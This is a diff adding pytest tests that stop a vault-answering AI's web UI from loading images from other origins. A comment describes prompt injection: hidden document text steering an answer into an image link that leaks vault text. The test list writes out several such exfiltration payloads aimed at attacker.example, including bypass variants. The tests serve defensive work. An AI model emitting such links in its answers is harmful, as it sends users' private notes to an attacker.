@@ -424,3 +424,72 @@ def test_too_many_files_in_one_drop_are_refused_before_anything_is_written(clien
     inbox = Path(CONFIG.vault_path) / "Inbox"
     assert not inbox.exists() or list(inbox.iterdir()) == []
     assert server._busy is False
+
+
+# --- ADR-0098 H6: an answer draws no image from another origin ---------------
+# Text a document hid from the student can steer an answer into
+# `![](https://attacker/?d=<vault text>)`, which the browser fetches the moment
+# it draws the answer. A note keeps its web images, as Obsidian draws them.
+
+_FOREIGN_IMAGES = [
+    "Answer. ![x](https://attacker.example/p.png?d=SECRET)",
+    "Answer. ![x](HTTPS://attacker.example/p.png?d=SECRET)",
+    # protocol-relative: no scheme, so it passes every "starts with http" test
+    "Answer. ![x](//attacker.example/p.png?d=SECRET)",
+    'Answer. <img src="https://attacker.example/p.png?d=SECRET">',
+    'Answer. <img src="//attacker.example/p.png?d=SECRET">',
+    # a browser reads `\` as `/` in an http(s) URL, so this is `//attacker...`
+    'Answer. <img src="/\\attacker.example/p.png?d=SECRET">',
+    # alone on its line the tag is an html_block, not inline html
+    'Answer.\n\n<img src="//attacker.example/p.png?d=SECRET">',
+]
+
+
+@pytest.mark.parametrize("answer", _FOREIGN_IMAGES)
+def test_an_answer_draws_no_image_from_another_origin(answer):
+    from silica.ui.web.server import _linkify
+
+    html = _linkify(answer, None, remote_images=False)
+    leaving = [a["src"] for tag, a in _live_markup(html)
+               if tag == "img" and not a["src"].startswith(("/asset?", "data:image/"))]
+    assert leaving == []
+
+
+def test_an_answer_keeps_the_vaults_own_images():
+    from silica.ui.web.server import _linkify
+
+    html = _linkify("![a](assets/a.png) ![d](data:image/png;base64,iVBORw0KGgo=)",
+                    None, remote_images=False)
+    srcs = [a["src"] for tag, a in _live_markup(html) if tag == "img"]
+    assert len(srcs) == 2
+    assert all(s.startswith(("/asset?", "data:image/")) for s in srcs)
+
+
+def test_a_note_keeps_its_web_images():
+    assert '<img src="https://example.org/fig.png"' in _render("![fig](https://example.org/fig.png)")
+
+
+def test_a_reloaded_chat_draws_no_image_from_another_origin(client):
+    tc, server = client
+    server.messages.append({"role": "assistant", "content": "![x](//attacker.example/p.png?d=SECRET)"})
+
+    html = tc.get("/messages").json()[-1]["html"]
+    assert "<img" not in html and "image from attacker.example" in html
+
+
+def test_on_the_server_the_page_draws_only_its_own_images(client, monkeypatch):
+    tc, _ = client
+    assert "content-security-policy" not in tc.get("/").headers
+
+    monkeypatch.setenv("SILICA_HOSTED", "1")
+    assert tc.get("/").headers["content-security-policy"] == "img-src 'self' data: blob:"
+
+
+def test_the_asset_route_keeps_its_own_policy_on_the_server(client, tmp_vault, monkeypatch):
+    tc, _ = client
+    Path(tmp_vault.note("fig.md")).with_name("fig.png").write_bytes(b"\x89PNG\r\n\x1a\n")
+    monkeypatch.setenv("SILICA_HOSTED", "1")
+
+    resp = tc.get("/asset", params={"path": "fig.png"})
+    assert resp.status_code == 200
+    assert resp.headers["content-security-policy"].startswith("default-src 'none'")
